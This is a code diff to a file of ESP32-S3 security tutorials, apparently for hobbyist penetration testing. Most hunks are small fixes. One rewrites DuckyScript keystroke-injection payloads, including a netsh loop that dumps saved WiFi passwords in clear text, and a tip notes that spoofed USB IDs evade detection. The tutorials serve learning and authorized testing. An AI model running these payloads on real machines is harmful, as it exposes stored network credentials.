@@ -50,9 +50,9 @@ window.SignalGuides = {
             '<rect x="315" y="238" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +
             '<text x="340" y="268" text-anchor="middle" fill="#8b949e" font-size="7">USB-C</text>' +
             '<!-- Buttons -->' +
-            '<circle cx="200" y="245" r="8" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
+            '<circle cx="200" cy="245" r="8" fill="#1a1f2b" stroke="#22c55e" stroke-width="1.5"/>' +
             '<text x="200" y="268" text-anchor="middle" fill="#22c55e" font-size="6">BOOT</text>' +
-            '<circle cx="480" y="245" r="8" fill="#1a1f2b" stroke="#eab308" stroke-width="1.5"/>' +
+            '<circle cx="480" cy="245" r="8" fill="#1a1f2b" stroke="#eab308" stroke-width="1.5"/>' +
             '<text x="480" y="268" text-anchor="middle" fill="#eab308" font-size="6">USER</text>' +
             '<!-- Feature callouts -->' +
             '<rect x="30" y="90" width="130" height="80" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.15)" stroke-width="0.5"/>' +
@@ -74,7 +74,7 @@ window.SignalGuides = {
                 title: 'Install PlatformIO and Configure the Board',
                 content: '<p>Install PlatformIO as a VS Code extension. Create a new project with board <code>lilygo-t-display-s3</code> and framework <code>arduino</code>. If that board is not listed, use <code>esp32-s3-devkitc-1</code> and configure manually.</p>' +
                          '<p>In <code>platformio.ini</code>, configure for USB OTG support:</p>',
-                code: '[env:t-display-s3]\nplatform = espressif32\nboard = lilygo-t-display-s3\nframework = arduino\nmonitor_speed = 115200\nbuild_flags = \n    -DARDUINO_USB_MODE=1\n    -DARDUINO_USB_CDC_ON_BOOT=1\n    -DBOARD_HAS_PSRAM\nlib_deps = \n    bodmer/TFT_eSPI@^2.5.0\n    ; For USB HID:\n    espressif/esp32-usb\nupload_speed = 921600',
+                code: '[env:t-display-s3]\nplatform = espressif32\nboard = lilygo-t-display-s3\nframework = arduino\nmonitor_speed = 115200\nbuild_flags = \n    -DARDUINO_USB_MODE=1\n    -DARDUINO_USB_CDC_ON_BOOT=1\n    -DBOARD_HAS_PSRAM\nlib_deps = \n    bodmer/TFT_eSPI@^2.5.0\n\nupload_speed = 921600',
                 language: 'INI',
                 tip: '<strong>ARDUINO_USB_MODE=1</strong> enables native USB (OTG mode). Without this flag, the USB port only works as a serial connection through the CH340 chip. This is the single most important build flag for all S3 security projects.'
             },
@@ -221,9 +221,7 @@ window.SignalGuides = {
                 consequence: 'The board types commands immediately on plug-in. If the payload opens a terminal and runs commands, you have just executed unauthorized actions on someone else\'s machine. This can result in disciplinary action, legal consequences, or damage to systems.'
             }
         ]
-    }
-
-},
+    },
 
     // ========================================================================
     // SG-94: USB Keystroke Injection — Advanced Payloads
@@ -285,7 +283,7 @@ window.SignalGuides = {
             {
                 title: 'Create Safe Demonstration Payloads',
                 content: '<p>Store payload files on SPIFFS. These three payloads are safe, educational, and reversible:</p>',
-                code: '// payload1.txt — System Info (Windows)\n// Saves to: sysinfo.txt on Desktop\nREM System Information Collector\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt\nENTER\nDELAY 2000\nREM File created on Desktop\n\n// payload2.txt — Create Evidence File\nREM Creates a text file proving USB access\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING USB Security Assessment\nENTER\nSTRING This file was created by an authorized USB device.\nENTER\nSTRING Timestamp: \nENTER\nSTRING If you see this file, USB HID devices are not blocked.\nENTER\n\n// payload3.txt — WiFi Passwords (Windows)\nREM Extract saved WiFi passwords\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c netsh wlan show profiles | findstr "All User" > %USERPROFILE%\\Desktop\\wifi_audit.txt & for /f "tokens=4 delims=:" %a in (\'netsh wlan show profiles ^| findstr "All User"\') do @(netsh wlan show profile name=%a key=clear | findstr "Key Content" >> %USERPROFILE%\\Desktop\\wifi_audit.txt)\nENTER',
+                code: 'REM payload1.txt — System Info (Windows)\nREM Saves to: sysinfo.txt on Desktop\nREM System Information Collector\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c systeminfo > %USERPROFILE%\\Desktop\\sysinfo.txt\nENTER\nDELAY 2000\nREM File created on Desktop\n\nREM payload2.txt — Create Evidence File\nREM Creates a text file proving USB access\nDELAY 1000\nGUI r\nDELAY 500\nSTRING notepad\nENTER\nDELAY 1000\nSTRING USB Security Assessment\nENTER\nSTRING This file was created by an authorized USB device.\nENTER\nSTRING Timestamp: \nENTER\nSTRING If you see this file, USB HID devices are not blocked.\nENTER\n\nREM payload3.txt — WiFi Passwords (Windows)\nREM Extract saved WiFi passwords\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c netsh wlan show profiles | findstr "All User" > %USERPROFILE%\\Desktop\\wifi_audit.txt & for /f "tokens=4 delims=:" %a in (\'netsh wlan show profiles ^| findstr "All User"\') do @(netsh wlan show profile name=%a key=clear | findstr "Key Content" >> %USERPROFILE%\\Desktop\\wifi_audit.txt)\nENTER',
                 language: 'DuckyScript',
                 tip: '<strong>Payload 3 extracts saved WiFi passwords on Windows.</strong> This is a common penetration testing technique &mdash; saved WiFi credentials are stored in plaintext by Windows and accessible to any user. The defense is to use WPA2-Enterprise with certificate-based auth instead of PSK.'
             },
@@ -377,8 +375,7 @@ window.SignalGuides = {
             }
         ]
     }
-
-},
+,
 
     // ========================================================================
     // SG-95: WiFi Recon Scanner with Display UI
@@ -414,7 +411,7 @@ window.SignalGuides = {
             {
                 title: 'Channel Histogram View',
                 content: '<p>Switch to a channel utilization view showing how many networks are on each channel. This helps identify congestion and find the quietest channel &mdash; useful for both offense (finding targets) and defense (optimizing your own network).</p>',
-                code: 'void drawChannelHistogram() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Count networks per channel\n    int channelCount[14] = {0};\n    for (int i = 0; i < networkCount; i++) {\n        if (networks[i].channel >= 1 && networks[i].channel <= 13) {\n            channelCount[networks[i].channel]++;\n        }\n    }\n    \n    // Find max for scaling\n    int maxCount = 1;\n    for (int ch = 1; ch <= 13; ch++) {\n        if (channelCount[ch] > maxCount) maxCount = channelCount[ch];\n    }\n    \n    // Header\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(5, 2);\n    tft.printf("CHANNEL MAP  %d networks", networkCount);\n    \n    // Draw bars\n    int barWidth = 20;\n    int maxBarHeight = 100;\n    for (int ch = 1; ch <= 13; ch++) {\n        int x = 10 + (ch - 1) * 23;\n        int barH = (channelCount[ch] * maxBarHeight) / maxCount;\n        int y = 130 - barH;\n        \n        // Color: non-overlapping channels (1,6,11) in green, others yellow\n        uint16_t color = (ch == 1 || ch == 6 || ch == 11) ? 0x07E0 : 0xFFE0;\n        \n        if (barH > 0) {\n            tft.fillRect(x, y, barWidth, barH, color);\n        }\n        \n        // Channel label\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(x + 4, 135);\n        tft.printf("%d", ch);\n        \n        // Count label\n        if (channelCount[ch] > 0) {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n            tft.setCursor(x + 4, y - 10);\n            tft.printf("%d", channelCount[ch]);\n        }\n    }\n    \n    // Legend\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(5, 150);\n    tft.print("Green=non-overlapping (1,6,11)");\n    tft.setTextColor(0xFFE0, TFT_BLACK);\n    tft.setCursor(5, 162);\n    tft.print("Yellow=overlapping channels");\n}',
+                code: 'void drawChannelHistogram() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Count networks per channel\n    int channelCount[14] = {0};\n    for (int i = 0; i < networkCount; i++) {\n        if (networks[i].channel >= 1 && networks[i].channel <= 13) {\n            channelCount[networks[i].channel]++;\n        }\n    }\n    \n    // Find max for scaling\n    int maxCount = 1;\n    for (int ch = 1; ch <= 13; ch++) {\n        if (channelCount[ch] > maxCount) maxCount = channelCount[ch];\n    }\n    \n    // Header\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(5, 2);\n    tft.printf("CHANNEL MAP  %d networks", networkCount);\n    \n    // Draw bars\n    int barWidth = 20;\n    int maxBarHeight = 100;\n    for (int ch = 1; ch <= 13; ch++) {\n        int x = 10 + (ch - 1) * 23;\n        int barH = (channelCount[ch] * maxBarHeight) / maxCount;\n        int y = 130 - barH;\n        \n        // Color: non-overlapping channels (1,6,11) in green, others yellow\n        uint16_t color = (ch == 1 || ch == 6 || ch == 11) ? 0x07E0 : 0xFFE0;\n        \n        if (barH > 0) {\n            tft.fillRect(x, y, barWidth, barH, color);\n        }\n        \n        // Channel label\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(x + 4, 135);\n        tft.printf("%d", ch);\n        \n        // Count label\n        if (channelCount[ch] > 0) {\n            tft.setTextColor(TFT_WHITE, TFT_BLACK);\n            tft.setCursor(x + 4, y - 10);\n            tft.printf("%d", channelCount[ch]);\n        }\n    }\n    \n    // Legend\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(5, 130);\n    tft.print("Green=non-overlapping (1,6,11)");\n    tft.setTextColor(0xFFE0, TFT_BLACK);\n    tft.setCursor(5, 142);\n    tft.print("Yellow=overlapping channels");\n}',
                 language: 'C++',
                 tip: '<strong>Channels 1, 6, and 11</strong> are the only non-overlapping 2.4GHz channels. In a well-designed network, all APs use only these three. If you see networks on channels 2-5 or 7-10, they are causing co-channel interference with their neighbors.'
             },
@@ -485,8 +482,7 @@ window.SignalGuides = {
             }
         ]
     }
-
-},
+,
 
     // ========================================================================
     // SG-96: BLE Swiss Army — Scanner, Beacon, Detector
@@ -572,8 +568,7 @@ window.SignalGuides = {
             { title: 'Assuming MAC Address Uniquely Identifies a Device', correct: 'Use manufacturer data patterns, service UUIDs, and device names for identification. MAC addresses rotate on modern BLE devices.', incorrect: 'Tracking devices by MAC address alone and assuming a new MAC means a new device.', consequence: 'Your device count is inflated. One iPhone appears as 20+ different devices over an hour because it rotates its BLE MAC address every 15 minutes.' }
         ]
     }
-
-},
+,
 
     // ========================================================================
     // SG-97: USB Mass Storage Emulation
@@ -595,7 +590,7 @@ window.SignalGuides = {
             {
                 title: 'TinyUSB Mass Storage Setup',
                 content: '<p>Configure the ESP32-S3 to present as a USB mass storage device using TinyUSB. The host computer will see a new removable drive.</p>',
-                code: '#include "USB.h"\n#include "USBMSC.h"\n#include <SPIFFS.h>\n#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBMSC msc;\n\n// SPIFFS-backed mass storage callbacks\nstatic int32_t onRead(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {\n    // Read from SPIFFS image\n    // In production, this maps LBA to a disk image file\n    memset(buffer, 0, bufsize);\n    return bufsize;\n}\n\nstatic int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {\n    // Write to SPIFFS image (read-only for safety)\n    return bufsize;  // Accept but discard writes\n}\n\nstatic bool onStartStop(uint8_t power, bool start, bool loadEject) {\n    if (loadEject) {\n        // Host ejected the drive\n        tft.setCursor(5, 150);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.println("Drive ejected by host");\n    }\n    return true;\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    tft.fillScreen(TFT_BLACK);\n    \n    SPIFFS.begin(true);\n    \n    // Configure MSC\n    msc.vendorID("HEXWRTH");\n    msc.productID("S3-ARSENAL");\n    msc.productRevision("1.0");\n    msc.onRead(onRead);\n    msc.onWrite(onWrite);\n    msc.onStartStop(onStartStop);\n    msc.mediaPresent(true);\n    msc.begin(4096, 512);  // 4096 blocks x 512 bytes = 2MB drive\n    \n    USB.begin();\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(10, 20);\n    tft.println("USB STORAGE");\n    tft.setTextSize(1);\n    tft.setCursor(10, 60);\n    tft.println("Host sees: HEXWRTH S3-ARSENAL");\n    tft.println("Size: 2MB removable drive");\n    tft.println("Mode: Read-only");\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 110);\n    tft.println("Status: MOUNTED");\n}',
+                code: '#include "USB.h"\n#include "USBMSC.h"\n#include <SPIFFS.h>\n#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\nUSBMSC msc;\n\n// SPIFFS-backed mass storage callbacks\nstatic int32_t onRead(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {\n    // Read from SPIFFS image\n    // In production, this maps LBA to a disk image file\n    memset(buffer, 0, bufsize);\n    return bufsize;\n}\n\nstatic int32_t onWrite(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {\n    // Write to SPIFFS image (read-only for safety)\n    return bufsize;  // Accept but discard writes\n}\n\nstatic bool onStartStop(uint8_t power, bool start, bool loadEject) {\n    if (loadEject) {\n        // Host ejected the drive\n        tft.setCursor(5, 130);\n        tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n        tft.println("Drive ejected by host");\n    }\n    return true;\n}\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    tft.fillScreen(TFT_BLACK);\n    \n    SPIFFS.begin(true);\n    \n    // Configure MSC\n    msc.vendorID("HEXWRTH");\n    msc.productID("S3-ARSENAL");\n    msc.productRevision("1.0");\n    msc.onRead(onRead);\n    msc.onWrite(onWrite);\n    msc.onStartStop(onStartStop);\n    msc.mediaPresent(true);\n    msc.begin(4096, 512);  // 4096 blocks x 512 bytes = 2MB drive\n    \n    USB.begin();\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(10, 20);\n    tft.println("USB STORAGE");\n    tft.setTextSize(1);\n    tft.setCursor(10, 60);\n    tft.println("Host sees: HEXWRTH S3-ARSENAL");\n    tft.println("Size: 2MB removable drive");\n    tft.println("Mode: Read-only");\n    tft.setTextColor(0x07E0, TFT_BLACK);\n    tft.setCursor(10, 110);\n    tft.println("Status: MOUNTED");\n}',
                 language: 'C++',
                 tip: '<strong>vendorID and productID</strong> are the strings the host shows in Device Manager / lsusb. You can set these to anything &mdash; including mimicking a legitimate USB drive brand. This is how malicious USB devices evade detection by appearing as known-good hardware.'
             },
@@ -650,8 +645,7 @@ window.SignalGuides = {
             { title: 'Setting Drive to Read-Write Without Understanding the Risk', correct: 'Start with read-only mode. Only enable writes when you have a specific, authorized reason (e.g., testing USB DLP policies). Log all write operations.', incorrect: 'Setting the drive to read-write by default and allowing arbitrary file writes to the ESP32-S3 storage.', consequence: 'The host OS (or malware on the host) writes to your device, potentially corrupting SPIFFS, filling flash storage, or overwriting your payload files.' }
         ]
     }
-
-},
+,
 
     // ========================================================================
     // SG-98: Network Adapter Impersonation (USB RNDIS/ECM)
@@ -728,8 +722,7 @@ window.SignalGuides = {
             { title: 'Forgetting That DoH Bypasses Port 53 DNS', correct: 'Understand that modern browsers use DNS-over-HTTPS by default, which encrypts DNS queries inside HTTPS (port 443) and sends them directly to a cloud DNS resolver. Your port 53 DNS server never sees these queries.', incorrect: 'Assuming that controlling port 53 DNS gives you complete DNS control over the host.', consequence: 'The attack silently fails for any application using DoH. Chrome, Firefox, and Edge all default to DoH in recent versions. Only legacy applications and system-level queries (Windows DNS Client) use port 53.' }
         ]
     }
-
-},
+,
 
     // ========================================================================
     // SG-99: WiFi Deauthentication Analysis & Detection
@@ -799,8 +792,7 @@ window.SignalGuides = {
             { title: 'Running Detection and Transmission on the Same Radio', correct: 'The ESP32-S3 has one 2.4GHz radio. It can either be in promiscuous receive mode (detection) or transmit mode (analysis). Not both simultaneously.', incorrect: 'Trying to monitor for deauth attacks while also generating test frames on the same device.', consequence: 'The radio mode switches conflict. Either detection stops working during transmission, or transmission fails because the radio is in receive mode. Use two separate devices for simultaneous red team / blue team testing.' }
         ]
     }
-
-},
+,
 
     // ========================================================================
     // SG-100: Marauder Firmware — WiFi Assessment Suite
@@ -822,7 +814,7 @@ window.SignalGuides = {
             {
                 title: 'Download and Flash Marauder',
                 content: '<p>The ESP32 Marauder firmware is available as a pre-compiled binary for various ESP32 boards. For the T-Display-S3, you need the S3-specific build with ST7789 display support.</p>',
-                code: '# Option 1: Web Flasher (easiest)\n# Visit: https://esp.huhn.me/\n# or: https://github.com/justcallmekoko/ESP32Marauder/wiki\n# Select your board, click Flash\n\n# Option 2: esptool command line\npip install esptool\n\n# Download the T-Display-S3 build from:\n# https://github.com/justcallmekoko/ESP32Marauder/releases\n# Look for: esp32_marauder_*_tdisplay_s3.bin\n\n# Flash the firmware:\nesptool.py --chip esp32s3 \\\n    --port /dev/ttyACM0 \\\n    --baud 921600 \\\n    --before default_reset \\\n    --after hard_reset \\\n    write_flash 0x0 esp32_marauder_tdisplay_s3.bin\n\n# If flashing fails, hold BOOT button while plugging in USB',
+                code: '# Option 1: Web Flasher (easiest)\n# Visit: https://esp.huhn.me/\n# or: https://github.com/justcallmekoko/ESP32Marauder/wiki\n# Select your board, click Flash\n\n# Option 2: esptool command line\npip install esptool\n\n# Download the T-Display-S3 build from:\n# https://github.com/justcallmekoko/ESP32Marauder/releases\n# Look for: esp32_marauder_*_tdisplay_s3.bin\n\n# Flash the firmware:\nesptool.py --chip esp32s3 \\\n    --port /dev/ttyACM0 \\\n    --baud 921600 \\\n    --before no_reset \\\n    --after hard_reset \\\n    write_flash 0x0 esp32_marauder_tdisplay_s3.bin\n\n# If flashing fails, hold BOOT button while plugging in USB',
                 language: 'Bash',
                 tip: '<strong>The web flasher is the easiest method.</strong> It works in Chrome/Edge (Web Serial API). No software installation needed. Just connect the board, select the firmware, and click Flash.'
             },
